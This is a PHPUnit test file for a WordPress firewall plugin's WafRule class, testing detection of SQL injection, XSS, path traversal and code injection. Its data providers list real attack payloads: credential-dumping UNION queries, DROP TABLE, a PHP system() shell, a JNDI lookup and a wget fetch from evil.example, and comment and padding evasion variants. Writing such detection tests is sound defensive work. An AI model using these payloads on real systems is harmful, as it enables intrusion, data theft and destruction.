<?php
/**
 * @package WPBouncer\Tests
 */

namespace WPBouncer\Tests\Unit\Rules;

use PHPUnit\Framework\TestCase;
use WPBouncer\Rules\WafRule;
use WPBouncer\Tests\Support\Requests;

/**
 * @covers \WPBouncer\Rules\WafRule
 */
final class WafRuleTest extends TestCase {

	private function rule( array $overrides = array() ): WafRule {
		return new WafRule(
			array_merge(
				array(
					'enabled'         => true,
					'sqli'            => true,
					'xss'             => true,
					'traversal'       => true,
					'code_injection'  => true,
					'excluded_params' => array(),
				),
				$overrides
			)
		);
	}

	/** @dataProvider attacks */
	public function test_blocks_attack_payloads( string $category, string $payload ): void {
		$verdict = $this->rule()->inspect( Requests::make( array( 'query' => array( 'q' => $payload ) ) ) );
		$this->assertNotNull( $verdict, "should block: {$payload}" );
		$this->assertStringContainsString( $category, $verdict->reason() );
	}

	public static function attacks(): array {
		return array(
			array( 'sqli', "1' UNION SELECT user_login,user_pass FROM wp_users--" ),
			array( 'sqli', '1 union/**/all/**/select 1,2,3' ),
			array( 'sqli', "admin' OR '1'='1" ),
			array( 'sqli', '1 AND SLEEP(5)' ),
			array( 'sqli', "1; WAITFOR DELAY '0:0:5'" ),
			array( 'sqli', 'x FROM information_schema.tables' ),
			array( 'sqli', "1' INTO OUTFILE '/var/www/shell.php" ),
			array( 'sqli', '1; DROP TABLE wp_users' ),
			array( 'xss', '<script>alert(1)</script>' ),
			array( 'xss', '<img src=x onerror=alert(1)>' ),
			array( 'xss', '<svg/onload=alert(1)>' ),
			array( 'xss', 'javascript:alert(document.cookie)' ),
			array( 'xss', '<iframe src="//evil">' ),
			array( 'xss', '%3Cscript%3Ealert(1)%3C/script%3E' ),
			array( 'traversal', '../../../../etc/passwd' ),
			array( 'traversal', '..\\..\\..\\windows\\win.ini' ),
			array( 'traversal', '../wp-config.php' ),
			array( 'traversal', 'php://filter/convert.base64-encode/resource=index.php' ),
			array( 'code_injection', '<?php system($_GET["c"]); ?>' ),
			array( 'code_injection', 'eval(base64_decode("ZWNobyAxOw=="))' ),
			array( 'code_injection', '${jndi:ldap://evil.example/a}' ),
			array( 'code_injection', '; wget http://evil.example/x.sh' ),
		);
	}

	/** @dataProvider harmless */
	public function test_allows_normal_input( string $value ): void {
		$this->assertNull( $this->rule()->inspect( Requests::make( array( 'query' => array( 's' => $value ) ) ) ), "false positive: {$value}" );
	}

	public static function harmless(): array {
		return array(
			array( 'how to select a union representative' ),
			array( 'Tom & Jerry: the "best" cartoon?' ),
			array( "It's 5 o'clock and I'm 1 = happy" ),
			array( 'I <3 the online community = great' ),
			array( 'email me at a.b@example.com' ),
			array( 'Use the system (it works) and evaluate it' ),
			array( 'C:\\Users\\me\\Documents' ),
			array( 'Edit wp-config.php to add the key' ),
			array( 'price: 10-20 EUR -- negotiable' ),
			array( '<b>bold</b> and <em>emphasis</em>' ),
			array( 'Sleep is important (8 hours)' ),
		);
	}

	public function test_inspects_post_body_and_nested_keys(): void {
		$req     = Requests::make(
			array(
				'method' => 'POST',
				'post'   => array( 'meta' => array( 'inner' => array( 'x' => '<script>' ) ) ),
			)
		);
		$verdict = $this->rule()->inspect( $req );
		$this->assertNotNull( $verdict );
		$this->assertStringContainsString( 'body parameter "meta"', $verdict->reason() );
	}

	public function test_inspects_parameter_names(): void {
		$this->assertNotNull( $this->rule()->inspect( Requests::make( array( 'query' => array( '<script>' => '1' ) ) ) ) );
	}

	public function test_traversal_in_path(): void {
		$this->assertNotNull( $this->rule()->inspect( Requests::make( array( 'uri' => '/wp-content/../../../../etc/passwd' ) ) ) );
		$this->assertNotNull( $this->rule()->inspect( Requests::make( array( 'uri' => '/%2e%2e/%2e%2e/etc/passwd' ) ) ) );
		$this->assertNull( $this->rule()->inspect( Requests::make( array( 'uri' => '/select-union-guide/' ) ) ), 'SQL words in a slug are fine' );
	}

	public function test_categories_can_be_switched_off(): void {
		$req = Requests::make( array( 'query' => array( 'q' => '<script>alert(1)</script>' ) ) );
		$this->assertNull( $this->rule( array( 'xss' => false ) )->inspect( $req ) );
		$this->assertNotNull( $this->rule( array( 'sqli' => false ) )->inspect( $req ) );
	}

	public function test_excluded_params_are_skipped(): void {
		$req = Requests::make( array( 'post' => array( 'custom_html' => array( 'a' => '<script>x</script>' ), 'other' => 'fine' ) ) );
		$this->assertNull( $this->rule( array( 'excluded_params' => array( 'custom_html' ) ) )->inspect( $req ) );
		$this->assertNotNull( $this->rule()->inspect( $req ) );
	}

	public function test_trusted_users_are_not_inspected(): void {
		$req = Requests::make(
			array(
				'post'    => array( 'content' => '<script>legit()</script>' ),
				'trusted' => true,
			)
		);
		$this->assertNull( $this->rule()->inspect( $req ) );
	}

	public function test_flatten(): void {
		$this->assertSame(
			array(
				'a'       => '1',
				'b[c]'    => '2',
				'b[d][0]' => '3',
			),
			WafRule::flatten(
				array(
					'a' => 1,
					'b' => array(
						'c' => '2',
						'd' => array( '3' ),
					),
				)
			)
		);
	}

	public function test_every_signature_compiles(): void {
		foreach ( WafRule::SIGNATURES as $category => $signatures ) {
			foreach ( $signatures as $name => $regex ) {
				$this->assertNotFalse( @preg_match( $regex, '' ), "{$category}/{$name} is not a valid regex" );
			}
		}
	}

	private function all_categories(): array {
		return WafRule::SIGNATURES;
	}

	public function test_signature_after_8kb_of_padding_is_detected(): void {
		$value = str_repeat( 'a ', 5000 ) . '<script>alert(1)</script>';
		$this->assertNotNull( WafRule::match_value( $value, $this->all_categories() ) );
		$verdict = $this->rule()->inspect( Requests::make( array( 'post' => array( 'c' => $value ) ) ) );
		$this->assertNotNull( $verdict );
	}

	public function test_signature_straddling_a_window_boundary_is_detected(): void {
		// 8192-byte windows, 7168 apart: put "<script" across the first boundary.
		$value = str_repeat( 'a', 8190 ) . '<script>';
		$this->assertSame( array( 'xss', 'script tag' ), WafRule::match_value( $value, $this->all_categories() ) );
	}

	public function test_signature_at_the_end_of_a_huge_value_is_detected(): void {
		$value = str_repeat( 'a ', 100000 ) . '<script>';
		$this->assertSame( 'xss', WafRule::match_value( $value, $this->all_categories() )[0] );
	}

	public function test_encoded_signature_after_padding_is_detected(): void {
		$value = str_repeat( 'a ', 5000 ) . '%3Cscript%3E';
		$this->assertNotNull( WafRule::match_value( $value, $this->all_categories() ) );
	}

	public function test_a_pcre_error_is_a_verdict_and_is_reported(): void {
		// A pattern that backtracks catastrophically stands in for any signature that trips the engine.
		$categories = array( 'sqli' => array( 'evil' => '/^(a+)+$/' ) );
		$verdict    = WafRule::match_value( str_repeat( 'a', 5000 ) . 'b', $categories );
		$this->assertSame( array( 'sqli', 'pattern error (evil)' ), $verdict );
		$this->assertSame( array( 'evil', PREG_BACKTRACK_LIMIT_ERROR ), WafRule::last_error() );
	}

	public function test_no_error_is_reported_for_clean_requests(): void {
		$this->rule()->inspect( Requests::make( array( 'query' => array( 'q' => 'hello' ) ) ) );
		$this->assertNull( WafRule::last_error() );
	}

	/**
	 * Built-in signatures must not match, or fail, on ordinary large content.
	 *
	 * @dataProvider benign_corpus
	 */
	public function test_benign_content_has_no_match_and_no_pcre_error( string $value ): void {
		$this->assertNull( WafRule::match_value( $value, $this->all_categories() ) );
		$this->assertSame( PREG_NO_ERROR, preg_last_error() );
	}

	public static function benign_corpus(): array {
		$block = '<!-- wp:paragraph --><p class="has-text-align-center">Some <strong>bold</strong> text, a <a href="https://example.org/a?b=1&amp;c=2">link</a>.</p><!-- /wp:paragraph -->' . "\n"
			. '<!-- wp:image {"id":12,"sizeSlug":"large"} --><figure class="wp-block-image size-large"><img src="https://example.org/wp-content/uploads/2026/01/a.jpg" alt="x" class="wp-image-12"/></figure><!-- /wp:image -->' . "\n";
		return array(
			'long html comment'      => array( '<!-- ' . str_repeat( 'lorem ipsum dolor sit amet ', 3000 ) . ' -->' ),
			'base64 blob'            => array( base64_encode( str_repeat( "\x00\x01binary\xff", 20000 ) ) ),
			'60 KB block editor post' => array( substr( str_repeat( $block, 400 ), 0, 61440 ) ),
			'woo checkout fields'    => array( 'billing_first_name=Jane&billing_last_name=O%27Neil&billing_address_1=12+Main+St&billing_postcode=SW1A+1AA&order_comments=Please+leave+at+the+door.+Thanks%21&shipping_method%5B0%5D=flat_rate%3A1&payment_method=stripe&woocommerce-process-checkout-nonce=abc123&_wp_http_referer=%2Fcheckout%2F' ),
			'long prose with quotes' => array( str_repeat( "It's a \"fine\" day -- isn't it? ", 3000 ) ),
			'long percent text'      => array( str_repeat( '100%25 done and %C3%A9 ', 3000 ) ),
		);
	}

	public function test_trusted_users_skip_long_value_scanning(): void {
		$value = str_repeat( 'a ', 5000 ) . '<script>';
		$this->assertNull( $this->rule()->inspect( Requests::make( array( 'post' => array( 'c' => $value ), 'trusted' => true ) ) ) );
	}

	public function test_no_signature_uses_the_unicode_modifier(): void {
		foreach ( WafRule::SIGNATURES as $category => $signatures ) {
			foreach ( $signatures as $name => $regex ) {
				$flags = substr( $regex, (int) strrpos( $regex, '/' ) + 1 );
				$this->assertStringNotContainsString( 'u', $flags, "{$category}/{$name} must not be /u: bad UTF-8 would be a PCRE error" );
			}
		}
	}

	public function test_no_signature_has_an_unbounded_quantifier(): void {
		foreach ( WafRule::SIGNATURES as $category => $signatures ) {
			foreach ( $signatures as $name => $regex ) {
				$this->assertSame( 0, preg_match( '/(?<!\\\\)[+*](?![^\[]*\])|\{\d+,\}/', preg_replace( '/\\\\./', '', $regex ) ), "{$category}/{$name} has an unbounded quantifier" );
			}
		}
	}

	/** @dataProvider attacks */
	public function test_every_attack_is_found_in_the_middle_of_a_boundary_with_1500_bytes_of_padding( string $category, string $payload ): void {
		// 8192-byte windows start every 7168 bytes; put the payload across the first boundary.
		foreach ( array( 8192 - (int) ( strlen( $payload ) / 2 ), 7168 + 8192 - (int) ( strlen( $payload ) / 2 ) ) as $at ) {
			$value = str_repeat( 'x ', (int) ( $at / 2 ) ) . $payload . str_repeat( 'y ', 750 );
			$this->assertNotNull( WafRule::match_value( $value, array( $category => WafRule::SIGNATURES[ $category ] ) ), "{$category}: {$payload}" );
		}
	}

	public function test_long_padding_inside_a_tag_before_an_event_handler_still_matches_across_a_boundary(): void {
		$tag   = '<img title="' . str_repeat( 'q', 700 ) . '" onerror=alert(1)>';
		$value = str_repeat( 'x ', 3800 ) . $tag . str_repeat( 'y ', 750 );
		$this->assertSame( 'xss', WafRule::match_value( $value, WafRule::SIGNATURES )[0] );
	}

	public function test_a_word_edge_made_by_a_window_start_is_not_a_match(): void {
		// The second window starts at byte 7168, in the middle of "reunion select".
		$value = str_repeat( 'a', 7168 - 2 ) . 'reunion select the best' . str_repeat( 'b', 9000 );
		$this->assertNull( WafRule::match_value( $value, WafRule::SIGNATURES ) );
		// Same for "href=\"#": "^"-style edges do not appear either.
		$value = str_repeat( 'a', 7168 - 6 ) . '<a href="#top">up</a>' . str_repeat( 'b', 9000 );
		$this->assertNull( WafRule::match_value( $value, WafRule::SIGNATURES ) );
		// Window 1 ends exactly after href="#, where "$" would match falsely.
		$value = str_repeat( 'a', 8192 - 8 ) . 'href="#' . str_repeat( 'b ', 9000 );
		$this->assertNull( WafRule::match_value( $value, WafRule::SIGNATURES ) );
		$value = str_repeat( 'a', 7168 - 3 ) . 'my-wp-config.php notes' . str_repeat( 'b', 9000 );
		$this->assertNull( WafRule::match_value( $value, WafRule::SIGNATURES ) );
	}

	public function test_a_real_union_select_at_the_boundary_still_matches(): void {
		$value = str_repeat( 'a ', 3583 ) . 'x union select 1' . str_repeat( 'b', 9000 );
		$this->assertSame( array( 'sqli', 'union select' ), WafRule::match_value( $value, WafRule::SIGNATURES ) );
	}

	public function test_a_trailing_comment_terminator_only_counts_at_the_end_of_the_value(): void {
		$cats = array( 'sqli' => array( 'comment terminator' => WafRule::SIGNATURES['sqli']['comment terminator'] ) );
		$this->assertNotNull( WafRule::match_value( "admin' --", $cats ) );
		$this->assertNotNull( WafRule::match_value( str_repeat( 'a', 9000 ) . "admin' --", $cats ) );
		// The quote-dash sits at the end of the first window, but the value goes on.
		$this->assertNull( WafRule::match_value( str_repeat( 'a', 8192 - 4 ) . "' -- " . str_repeat( 'b', 3000 ), $cats ) );
	}

	public function test_plain_large_values_are_skipped_by_the_gate_but_attacks_never_are(): void {
		$plain = str_repeat( 'lorem ipsum dolor ', 3000 );
		$this->assertNull( WafRule::match_value( $plain, WafRule::SIGNATURES ) );
		foreach ( array( 'x union select 1', 'into outfile x', '=wp-config.php', 'document.cookie' ) as $p ) {
			$this->assertNotNull( WafRule::match_value( $plain . $p, WafRule::SIGNATURES ), $p );
		}
	}

	/** @dataProvider padded_attacks */
	public function test_padding_cannot_push_a_payload_out_of_range( string $payload, string $category ): void {
		$hit = WafRule::match_value( $payload, WafRule::SIGNATURES );
		$this->assertNotNull( $hit, substr( $payload, 0, 40 ) );
		$this->assertSame( $category, $hit[0] );
		// The same payload preceded by plain text, so it also crosses window boundaries.
		$this->assertNotNull( WafRule::match_value( str_repeat( 'x ', 4090 ) . $payload . str_repeat( 'y ', 500 ), WafRule::SIGNATURES ) );
	}

	public static function padded_attacks(): array {
		return array(
			'img title 900'      => array( '<img title="' . str_repeat( 'A', 900 ) . '" onerror=alert(1)>', 'xss' ),
			'img title 20000'    => array( '<img title="' . str_repeat( 'A', 20000 ) . '" onerror=alert(1)>', 'xss' ),
			'tag, attrs, slash'  => array( '<svg ' . str_repeat( 'a=b ', 500 ) . '/onload=alert(1)>', 'xss' ),
			'union 250 spaces'   => array( 'x union' . str_repeat( ' ', 250 ) . 'select 1', 'sqli' ),
			'union 400 comments' => array( 'x union' . str_repeat( '/**/', 400 ) . 'select 1', 'sqli' ),
			'union 9000 spaces'  => array( 'x union' . str_repeat( ' ', 9000 ) . 'select 1', 'sqli' ),
			'union mixed'        => array( 'x union' . str_repeat( " /* a */\n\t", 300 ) . 'select 1', 'sqli' ),
			'union encoded pad'  => array( 'x union' . str_repeat( '%20', 9000 ) . 'select 1', 'sqli' ),
			'tautology 65'       => array( "x' or" . str_repeat( ' ', 65 ) . '1=1', 'sqli' ),
			'tautology 5000'     => array( "x' or" . str_repeat( ' ', 5000 ) . '1 = 1', 'sqli' ),
			'script tag pad'     => array( '<' . str_repeat( ' ', 300 ) . 'script>', 'xss' ),
			'sleep pad'          => array( 'sleep' . str_repeat( ' ', 300 ) . '(5)', 'sqli' ),
		);
	}

	/** @dataProvider harmless_handler_lookalikes */
	public function test_handler_lookalikes_outside_a_tag_pass( string $value ): void {
		$this->assertNull( WafRule::match_value( $value, WafRule::SIGNATURES ), $value );
	}

	public static function harmless_handler_lookalikes(): array {
		return array(
			'prose'             => array( 'He said online=yes and once = twice' ),
			'closed tag first'  => array( '<b>bold</b> then onclick=hello' ),
			'less-than digit'   => array( 'if 3 < 4 onload=1' ),
			'tag then close'    => array( '<p class="x"> text onfoo=bar' ),
			'spaced prose'      => array( str_repeat( 'lorem ipsum ', 2000 ) . ' onerror=fine' ),
		);
	}

	public function test_a_quoted_handler_after_an_unclosed_tag_is_found_after_closed_ones(): void {
		$this->assertSame( 'xss', WafRule::match_value( '<b>x</b> <a href="#" title=\'t\' onmouseover=x()', WafRule::SIGNATURES )[0] );
	}

	/** @dataProvider mysql_comment_variants */
	public function test_mysql_comment_variants_do_not_hide_sqli( string $payload ): void {
		$hit = WafRule::match_value( $payload, WafRule::SIGNATURES );
		$this->assertNotNull( $hit, $payload );
		$this->assertSame( 'sqli', $hit[0] );
	}

	public static function mysql_comment_variants(): array {
		return array(
			'split word'            => array( '1 un/*!ion*/ select 1' ),
			'versioned'             => array( '1 /*!50000union*/ /*!50000select*/ 1' ),
			'versioned, spaces'     => array( '1 /*!50000 union */ select 1' ),
			'bang only'             => array( '1 /*!union*/select 1' ),
			'both bang'             => array( '1 /*!union*//*!select*/ 1' ),
			'nested bang'           => array( '1 /*!50000 /*!50000 union*/ */ select 1' ),
			'unterminated bang'     => array( '1 /*!50000union select 1' ),
			'empty comments'        => array( '1 union/**//**/select 1' ),
			'comment with newline'  => array( "1 union/* a\nb */select 1" ),
			'sleep split'           => array( '1 and sl/*!eep*/(5)' ),
			'information_schema'    => array( 'x /*!information_schema*/.tables' ),
			'into outfile'          => array( "1' into/*!50000 outfile*/ '/x" ),
			'tautology comments'    => array( "x' /**/or/**/ 1=1" ),
			'encoded bang'          => array( '1%20un/*!ion*/%20select%201' ),
		);
	}

	public function test_comment_normaliser_is_linear_on_hostile_input(): void {
		foreach ( array( str_repeat( '/*!', 20000 ), str_repeat( '/*', 30000 ), str_repeat( '/*/', 30000 ), str_repeat( '*/', 30000 ), str_repeat( '/**', 30000 ), '/*!' . str_repeat( '*', 50000 ), str_repeat( '/*!50000 ', 5000 ) . 'x' ) as $hostile ) {
			$start = microtime( true );
			WafRule::match_value( $hostile, WafRule::SIGNATURES );
			$this->assertLessThan( 1.0, microtime( true ) - $start );
		}
	}

	public function test_quotes_in_attribute_values_are_tracked(): void {
		// A ">" inside a quoted value does not close the tag.
		$this->assertSame( 'xss', WafRule::match_value( '<img alt="a>b" onerror=alert(1)>', WafRule::SIGNATURES )[0] );
		$this->assertSame( 'xss', WafRule::match_value( "<img alt='a>b' title=\"c>d\" onerror=alert(1)>", WafRule::SIGNATURES )[0] );
		// A quote in the middle of an unquoted value is literal, so it hides nothing.
		$this->assertSame( 'xss', WafRule::match_value( '<img src=x"onerror=alert(1)>', WafRule::SIGNATURES )[0] );
		$this->assertSame( 'xss', WafRule::match_value( '<img src="x"onerror=alert(1)>', WafRule::SIGNATURES )[0] );
		// Text that only looks like a handler inside a quoted value is inert.
		$this->assertNull( WafRule::match_value( '<img alt="see onerror=alert(1) here">', WafRule::SIGNATURES ) );
		// A closed tag, then a quote-laden text, then a lookalike: no tag is open.
		$this->assertNull( WafRule::match_value( '<p title="a">text "quoted" onclick=fine', WafRule::SIGNATURES ) );
	}
}
